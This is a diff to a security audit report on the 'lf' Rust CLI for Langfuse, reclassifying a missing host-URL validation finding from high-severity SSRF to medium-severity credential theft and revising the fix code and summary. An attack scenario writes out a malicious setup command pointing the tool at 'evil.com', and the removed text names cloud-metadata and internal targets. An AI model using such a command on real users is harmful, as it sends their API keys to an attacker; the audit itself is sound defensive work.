@@ -20,8 +20,8 @@ The application follows many security best practices, but several areas require 
 | Category | Severity | Count |
 |----------|----------|-------|
 | Critical | 0 | 0 |
-| High | 1 | 1 |
-| Medium | 3 | 3 |
+| High | 0 | 0 |
+| Medium | 4 | 4 |
 | Low | 4 | 4 |
 | Informational | 2 | 2 |
 | **Total** | | **10** |
@@ -30,18 +30,27 @@ The application follows many security best practices, but several areas require 
 
 ## Detailed Findings
 
-### 1. HIGH: Missing Host URL Validation (SSRF Risk)
+### 1. MEDIUM: Missing Host URL Validation (Credential Theft Risk)
 
-**Severity:** HIGH
+**Severity:** MEDIUM
 **Location:** `src/config.rs:156-160`, `src/client.rs:70`, `src/client.rs:120`
-**CWE:** CWE-918: Server-Side Request Forgery (SSRF)
+**CWE:** CWE-346: Origin Validation Error
 
 **Description:**
-The application accepts a `host` parameter from CLI arguments, environment variables, or configuration files without proper validation. This parameter is directly used to construct URLs for HTTP requests. An attacker could potentially:
-- Redirect requests to internal network resources (e.g., `http://localhost:6379`, `http://169.254.169.254/`)
-- Scan internal network ports
-- Access cloud metadata services
-- Perform denial of service attacks
+The application accepts a `host` parameter from CLI arguments, environment variables, or configuration files without proper validation. This parameter is directly used to construct URLs for HTTP requests with the user's API credentials via HTTP Basic Authentication.
+
+**Threat Model for CLI Tools:**
+Unlike server-side SSRF vulnerabilities, the risk here is **credential theft through social engineering**:
+- An attacker could provide malicious documentation or tutorials instructing users to configure a malicious host URL
+- Users' API keys (public_key and secret_key) would be sent to the attacker-controlled server
+- Without HTTPS enforcement, credentials could be transmitted in cleartext or intercepted via man-in-the-middle attacks
+- Phishing configuration files could be distributed with malicious host values
+
+**Attack Scenarios:**
+1. **Malicious Tutorial**: Attacker publishes a "getting started" guide that includes `lf config set --host http://evil.com`
+2. **Config File Poisoning**: Shared configuration files in repositories contain malicious host URLs
+3. **HTTP Downgrade**: User accidentally configures HTTP instead of HTTPS, exposing credentials in transit
+4. **Typosquatting**: Slight misspellings of the legitimate host could redirect to attacker-controlled servers
 
 **Vulnerable Code:**
 ```rust
@@ -57,10 +66,10 @@ let url = format!("{}/api/public{}", self.host, path);
 ```
 
 **Recommendation:**
-1. Validate that the host URL uses HTTPS (except for localhost in development)
-2. Implement a URL allowlist or validate against expected patterns
-3. Reject URLs pointing to private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, 169.254.0.0/16)
-4. Consider using the `url` crate to parse and validate URLs properly
+1. **Enforce HTTPS**: Require HTTPS for all non-localhost URLs to prevent cleartext credential transmission
+2. **Warn on Non-Default Hosts**: Display a prominent warning when users configure non-default hosts
+3. **URL Format Validation**: Validate URL format and reject malformed URLs
+4. **Optional Host Allowlist**: Consider allowing users to configure an allowlist of trusted hosts
 
 **Example Fix:**
 ```rust
@@ -69,17 +78,20 @@ fn validate_host_url(host: &str) -> Result<()> {
         .context("Invalid host URL format")?;
 
     // Require HTTPS for non-localhost
-    if url.scheme() != "https" && !url.host_str().unwrap_or("").contains("localhost") {
-        return Err(anyhow::anyhow!("Host must use HTTPS"));
+    if url.scheme() != "https" {
+        let host_str = url.host_str().unwrap_or("");
+        if !host_str.contains("localhost") && !host_str.starts_with("127.") {
+            return Err(anyhow::anyhow!(
+                "Security: Host must use HTTPS. HTTP is only allowed for localhost."
+            ));
+        }
     }
 
-    // Block private IP ranges
-    if let Some(host_str) = url.host_str() {
-        if let Ok(ip) = host_str.parse::<std::net::IpAddr>() {
-            if ip.is_loopback() || is_private_ip(&ip) {
-                return Err(anyhow::anyhow!("Private IP addresses are not allowed"));
-            }
-        }
+    // Warn about non-default hosts
+    if host != DEFAULT_HOST {
+        eprintln!("⚠️  WARNING: Using non-default Langfuse host: {}", host);
+        eprintln!("   Your API credentials will be sent to this server.");
+        eprintln!("   Only proceed if you trust this host.\n");
     }
 
     Ok(())
@@ -481,9 +493,9 @@ The following security practices are implemented correctly:
 
 ## Recommendations Summary
 
-### Immediate Actions (High Priority)
+### Immediate Actions (Medium Priority)
 
-1. **Implement Host URL Validation** - Prevent SSRF attacks by validating the host parameter
+1. **Implement Host URL Validation** - Prevent credential theft by validating host URLs and enforcing HTTPS
 2. **Add Windows File Permissions** - Protect config files on Windows systems
 3. **Sanitize Error Messages** - Prevent sensitive information disclosure
 
@@ -505,7 +517,8 @@ The following security practices are implemented correctly:
 ## Testing Recommendations
 
 1. **Security Test Cases:**
-   - Test SSRF protection with various malicious URLs
+   - Test host URL validation with HTTP, malformed URLs, and non-default hosts
+   - Test HTTPS enforcement for remote hosts
    - Test file permission enforcement on Windows
    - Test error message sanitization
    - Test path traversal prevention
@@ -530,15 +543,15 @@ The following security practices are implemented correctly:
 | OWASP Category | Status | Notes |
 |----------------|--------|-------|
 | A01:2021 - Broken Access Control | ⚠️ Partial | File permissions need Windows support |
-| A02:2021 - Cryptographic Failures | ⚠️ Partial | Credentials stored in config files |
+| A02:2021 - Cryptographic Failures | ⚠️ Partial | Credentials stored in config files; needs HTTPS enforcement |
 | A03:2021 - Injection | ✅ Good | No SQL/Command injection vectors |
-| A04:2021 - Insecure Design | ⚠️ Needs Work | Missing SSRF protection |
+| A04:2021 - Insecure Design | ⚠️ Needs Work | Missing host URL validation and warnings |
 | A05:2021 - Security Misconfiguration | ✅ Good | Proper defaults, but could be better |
 | A06:2021 - Vulnerable Components | ✅ Good | Dependencies up-to-date |
 | A07:2021 - Authentication Failures | ✅ Good | Proper API authentication |
 | A08:2021 - Software and Data Integrity | ✅ Good | No supply chain issues detected |
 | A09:2021 - Security Logging | ⚠️ Partial | No security event logging |
-| A10:2021 - SSRF | ❌ Vulnerable | No host URL validation |
+| A10:2021 - SSRF | ✅ N/A for CLI | CLI tools are not vulnerable to SSRF; risk is credential theft via social engineering |
 
 ---
 
@@ -546,18 +559,21 @@ The following security practices are implemented correctly:
 
 The `lf` CLI tool demonstrates good security practices in many areas, particularly in avoiding common vulnerabilities like command injection and SQL injection. However, several important improvements are needed:
 
-**Critical fixes required:**
-- Implement host URL validation to prevent SSRF attacks
+**Medium priority improvements:**
+- Implement host URL validation with HTTPS enforcement to prevent credential theft
+- Add user warnings when configuring non-default hosts
 - Add Windows file permission protection
+- Sanitize error messages to prevent information disclosure
+- Add path validation for file operations
 
-**Priority improvements:**
-- Error message sanitization
-- Path validation for file operations
-- Rate limiting and retry logic
+**Low priority enhancements:**
+- Implement rate limiting and retry logic with backoff
+- Add certificate pinning for default host
+- Mask credentials in debug output
 
 The Rust language provides memory safety guarantees that eliminate entire classes of vulnerabilities (buffer overflows, use-after-free, etc.). The remaining security issues are primarily in application logic and input validation.
 
-**Overall Assessment:** The tool is suitable for use with the recommended fixes implemented. The HIGH severity SSRF vulnerability should be addressed before deploying in production environments where users might configure malicious hosts.
+**Overall Assessment:** The tool is suitable for general use in its current state. The identified vulnerabilities are all MEDIUM severity or lower, with the primary concern being social engineering attacks where users could be tricked into sending their credentials to malicious servers. Implementing the recommended host URL validation and HTTPS enforcement would significantly improve the security posture.
 
 ---
 
